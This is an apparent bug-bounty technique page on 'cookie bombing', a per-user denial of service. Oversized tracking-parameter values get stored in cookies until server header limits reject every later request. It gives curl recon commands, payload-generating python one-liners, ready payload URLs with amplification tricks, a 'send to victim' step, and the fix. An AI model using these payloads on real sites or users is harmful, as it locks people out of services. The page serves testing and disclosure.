---
title: "Cookie Bombing (DoS via Cookie Overflow)"
type: technique
tags: [cookie-bombing, dos, cookie, tracking-parameters, web, availability]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: []
status: active
severity_range: "LOW-MEDIUM"
---

# Cookie Bombing (DoS via Cookie Overflow)

## Overview

Cookie Bombing is a Denial of Service (DoS) attack that abuses applications which store URL parameters directly into cookies without validating their size. By sending tracking parameters with huge values, the attacker forces the victim's browser to store oversized cookies that exceed the HTTP server limit, causing a 400 (Bad Request) error on every subsequent request to that domain.

## Impact

- **Availability**: The affected user can no longer use the site while the oversized cookies persist
- **Typical severity**: Low to Medium (per-session DoS, not systemic)
- **Scope**: Can affect subdomains if the cookie is set on the parent domain (`.example.com`)

## How it works

1. Server has vulnerable code: `res.cookie('utm_source', req.query.utm_source)` with no size limit
2. Attacker sends `?utm_source=AAAAAA...` (4000+ chars)
3. Browser stores the oversized cookie for that domain
4. Subsequent requests send the cookie -> HTTP header > 8KB/16KB (Nginx limit)
5. Server rejects with a 400 error

## Where to look

Tracking parameters that get stored directly into cookies:

```
utm_source, utm_medium, utm_campaign, utm_content
gclid (Google Ads)
fbclid (Facebook)
ref, ssid, dclid
```

**Quick check:**

```bash
# Check whether the parameter is reflected in Set-Cookie
curl -I "https://target.com/?utm_source=size_test"
```

**Browser analysis:**
- DevTools -> Application/Storage -> Cookies
- Check whether `utm_source=size_test` appears as a cookie

**JavaScript analysis:**
Look for code that stores the cookie without size validation:

```javascript
// Vulnerable (no limit)
res.cookie('utm_source', req.query.utm_source);

// Safe (with limit)
res.cookie('utm_source', req.query.utm_source.substring(0, 100));
```

## Testing methodology

### 1. Reconnaissance

```bash
# Identify tracking parameters in the URL
# Check whether they appear in cookies after the request
curl -I "https://target.com/?utm_source=TEST" | grep -i set-cookie
```

### 2. Payload construction

```bash
# Generate a 4000-char string
python3 -c 'print("A"*4000)'

# Payload amplified via commas
# , -> %2C (triples the size via escape())
python3 -c 'print(",,"*2000)'
```

### 3. Limits to consider

| System | Limit |
|---------|--------|
| Browser (per domain) | ~180 cookies, up to 4KB each (~720KB total) |
| Nginx (header) | 8KB-16KB by default |
| Apache (header) | 8KB by default |

**Multiple-cookie strategy:** if a single parameter is capped at 4KB in the browser, use several simultaneous parameters to sum above the server limit.

### 4. Execution

```
1. Build a URL with payload: https://target.com/?utm_source=AAA...4000 chars
2. Open in the browser (or send to victim)
3. The oversized cookie is stored
4. Reload the page -> observe the 400 error
5. Open DevTools -> Network -> observe the Cookie header being rejected
```

### 5. Cross-subdomain amplification

```
If the cookie is set on the parent domain (.example.com):
-> All subdomains are affected too
-> Significantly increased impact
```

## Useful payloads

```bash
# Basic payload (4000 chars of 'A')
https://target.com/?utm_source=AAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]

# With comma amplification (escape() triples the size)
https://target.com/?utm_source=,,,,,,,,,,,,,,,,,,,,,,,,,,,[...]

# Multiple parameters to sum size
https://target.com/?utm_source=AA...&utm_medium=BB...&gclid=CC...
```

## Bypasses and considerations

- Some servers have larger limits (e.g. 32KB), so the payload must be bigger
- If cookies are `httpOnly` or `secure`, the vector still works since the issue is size, not JS
- Clearing cookies (DevTools -> Application -> Clear Storage) fixes the state for the victim
- **Not scalable** to a systemic DoS, it affects users one at a time

## Reporting tips

- Demonstrate with a PoC: a URL that, once visited, causes a 400 on every subsequent request
- Show the Set-Cookie in the response with the oversized value
- Show the 400 error on the following request
- Note whether the cookie is on the parent domain (subdomain amplification)
- Severity: Low if it only affects the user who clicks; Medium if it can be directed at specific users via a link
